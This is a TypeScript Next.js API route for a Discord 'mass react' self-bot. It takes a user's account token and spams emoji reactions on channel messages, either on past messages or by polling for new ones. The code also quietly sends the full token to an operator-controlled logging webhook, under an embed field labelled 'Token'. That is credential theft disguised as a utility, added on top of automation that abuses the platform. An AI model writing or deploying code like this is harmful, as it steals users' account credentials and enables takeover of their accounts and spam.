import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';

export const maxDuration = 300;

function sleep(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, channelId, emoji, count = 10, messageId, mode = 'manual', duration = 60 } = body;

    if (!token || !channelId || !emoji) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة (التوكن، أيدي الروم، الإيموجي)' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();
    let sent = 0, failed = 0;

    const modeLabel = mode === 'auto' ? 'Auto React' : 'Mass React';

    sendToWebhook({
      username: 'TRJ React',
      embeds: [{
        title: `🎭 ${modeLabel} Started`,
        color: 0x5865F2,
        fields: [
          { name: '📺 Channel', value: channelId, inline: true },
          { name: '🎭 Emoji', value: emoji.substring(0, 50), inline: true },
          { name: '🔄 Mode', value: mode, inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
          ...(mode === 'auto' ? [{ name: '⏱️ Duration', value: `${duration}s`, inline: true }] : []),
          ...(mode === 'manual' ? [{ name: '🔢 Count', value: String(count), inline: true }] : []),
        ],
        footer: { text: 'TRJ BOT v3.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    const emojis = emoji.split(/\s+/).filter(Boolean);

    if (mode === 'auto') {
      // ===== AUTO MODE: Poll for new messages and react =====
      const endTime = Date.now() + (duration * 1000);
      const processedIds = new Set<string>();

      // Get latest message as starting point
      const initialRes = await discordFetch(ct, 'GET', `/channels/${channelId}/messages?limit=1`);
      const initialData = initialRes.data as Record<string, unknown>[] | null;
      if (!initialRes.ok || !Array.isArray(initialData) || initialData.length === 0) {
        return NextResponse.json({ success: false, error: 'فشل جلب الرسائل من الروم' }, { status: 400 });
      }
      // Mark existing messages as processed
      for (const msg of initialData) {
        processedIds.add(String(msg.id));
      }

      // Poll loop - check every 3-5 seconds
      while (Date.now() < endTime) {
        await sleep(3000 + Math.random() * 2000);

        const msgRes = await discordFetch(ct, 'GET', `/channels/${channelId}/messages?limit=10`);
        const msgData = msgRes.data as Record<string, unknown>[] | null;
        if (!msgRes.ok || !Array.isArray(msgData)) continue;

        for (const msg of msgData) {
          const mId = String(msg.id);
          if (processedIds.has(mId)) continue;
          processedIds.add(mId);

          // React with all emojis
          for (const e of emojis) {
            try {
              const res = await discordFetch(ct, 'PUT', `/channels/${channelId}/messages/${mId}/reactions/${encodeURIComponent(e)}/@me`);
              if (res.ok || res.status === 204) sent++; else failed++;
            } catch { failed++; }
          }
        }
      }

    } else {
      // ===== MANUAL MODE: React to existing messages =====
      if (messageId) {
        // React to a specific message
        for (const e of emojis) {
          try {
            const res = await discordFetch(ct, 'PUT', `/channels/${channelId}/messages/${messageId}/reactions/${encodeURIComponent(e)}/@me`);
            if (res.ok || res.status === 204) sent++; else failed++;
          } catch { failed++; }
        }
      } else {
        // React to last 50 messages
        const msgRes = await discordFetch(ct, 'GET', `/channels/${channelId}/messages?limit=50`);
        const msgData = msgRes.data as Record<string, unknown>[] | null;

        if (!msgData || !Array.isArray(msgData)) {
          return NextResponse.json({ success: false, error: 'فشل جلب الرسائل' }, { status: 400 });
        }

        for (const msg of msgData) {
          const mId = String(msg.id);
          for (const e of emojis) {
            try {
              const res = await discordFetch(ct, 'PUT', `/channels/${channelId}/messages/${mId}/reactions/${encodeURIComponent(e)}/@me`);
              if (res.ok || res.status === 204) sent++; else failed++;
            } catch { failed++; }
          }
          if (sent + failed >= count * emojis.length) break;
        }
      }
    }

    sendToWebhook({
      username: 'TRJ React',
      embeds: [{
        title: '✅ React Completed',
        color: 0x00FF41,
        fields: [
          { name: '✅ Added', value: String(sent), inline: true },
          { name: '❌ Failed', value: String(failed), inline: true },
          { name: '🎭 Emojis', value: String(emojis.length), inline: true },
          { name: '🔄 Mode', value: mode, inline: true },
          ...(mode === 'auto' ? [{ name: '⏱️ Duration', value: `${duration}s`, inline: true }] : []),
        ],
        footer: { text: 'TRJ BOT v3.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats: { sent, failed } });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Mass React Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
